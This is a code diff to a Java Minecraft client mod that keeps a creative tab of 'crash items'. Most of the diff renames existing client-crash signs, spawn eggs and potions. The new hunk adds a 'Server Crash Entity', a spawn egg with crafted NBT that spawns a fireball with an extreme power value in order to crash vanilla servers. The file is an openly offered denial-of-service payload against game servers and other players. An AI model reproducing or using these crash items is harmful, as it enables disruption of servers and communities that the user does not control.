@@ -5,6 +5,7 @@ import me.nekosarekawaii.foxglove.creativetab.CreativeTab;
 import net.minecraft.item.ItemStack;
 import net.minecraft.item.Items;
 import net.minecraft.nbt.NbtCompound;
+import net.minecraft.nbt.NbtDouble;
 import net.minecraft.nbt.NbtList;
 import net.minecraft.nbt.NbtString;
 import net.minecraft.text.Text;
@@ -97,7 +98,7 @@ public class CrashItemsCreativeTab extends CreativeTab {
             this.putClientsideName(
                     crashSign,
                     Text.literal(
-                            Formatting.RED + Formatting.BOLD.toString() + "Client Crash Sign"
+                            Formatting.RED + Formatting.BOLD.toString() + "Client Instant Crash Sign"
                     )
             );
             current.add(crashSign);
@@ -117,7 +118,7 @@ public class CrashItemsCreativeTab extends CreativeTab {
             this.putClientsideName(
                     crashSignV2,
                     Text.literal(
-                            Formatting.RED + Formatting.BOLD.toString() + "Client Crash Sign V2"
+                            Formatting.RED + Formatting.BOLD.toString() + "Client Instant Crash Sign V2"
                     )
             );
             current.add(crashSignV2);
@@ -140,7 +141,7 @@ public class CrashItemsCreativeTab extends CreativeTab {
         crashEXPSpawnEgg.setNbt(crashEXPSpawnEggNBT);
         this.putClientsideName(crashEXPSpawnEgg,
                 Text.literal(
-                        Formatting.DARK_RED + Formatting.BOLD.toString() + "Crash Experience"
+                        Formatting.GOLD + Formatting.BOLD.toString() + "Client Crash Experience"
                 )
         );
         current.add(crashEXPSpawnEgg);
@@ -157,7 +158,7 @@ public class CrashItemsCreativeTab extends CreativeTab {
             sodiumFreezeEntitySpawnEgg.setNbt(sodiumFreezeEntitySpawnEggNBT);
             this.putClientsideName(sodiumFreezeEntitySpawnEgg,
                     Text.literal(
-                            Formatting.DARK_RED + Formatting.BOLD.toString() + "Sodium Freeze Entity"
+                            Formatting.DARK_RED + Formatting.BOLD.toString() + "Sodium Client Freeze Entity"
                     )
             );
             current.add(sodiumFreezeEntitySpawnEgg);
@@ -172,12 +173,33 @@ public class CrashItemsCreativeTab extends CreativeTab {
             instantCrashPot.setNbt(instantCrashPotNBT);
             this.putClientsideName(instantCrashPot,
                     Text.literal(
-                            Formatting.DARK_RED + Formatting.BOLD.toString() + "Instant Crash Pot"
+                            Formatting.DARK_RED + Formatting.BOLD.toString() + "Client Instant Crash Pot"
                     )
             );
             current.add(instantCrashPot);
 
         }
+
+        final ItemStack serverCrashEntity = new ItemStack(Items.PUFFERFISH_SPAWN_EGG);
+        final NbtCompound serverCrashEntityNbt = new NbtCompound();
+        final NbtCompound serverCrashEntityTagNbt = new NbtCompound();
+        final NbtList power = new NbtList();
+        power.add(NbtDouble.of(1.0E43));
+        power.add(NbtDouble.of(0));
+        power.add(NbtDouble.of(0));
+        serverCrashEntityTagNbt.put("power", power);
+        serverCrashEntityTagNbt.putString("id", "minecraft:small_fireball");
+        serverCrashEntityNbt.put("EntityTag", serverCrashEntityTagNbt);
+        serverCrashEntity.setNbt(serverCrashEntityNbt);
+        this.putClientsideName(serverCrashEntity,
+                Text.literal(
+                        Formatting.RED + Formatting.BOLD.toString() + "Server Crash Entity"
+                ),
+                Text.literal(
+                        "Doesn't work on Paper Spigot Servers."
+                )
+        );
+        current.add(serverCrashEntity);
 
         return current;
     }
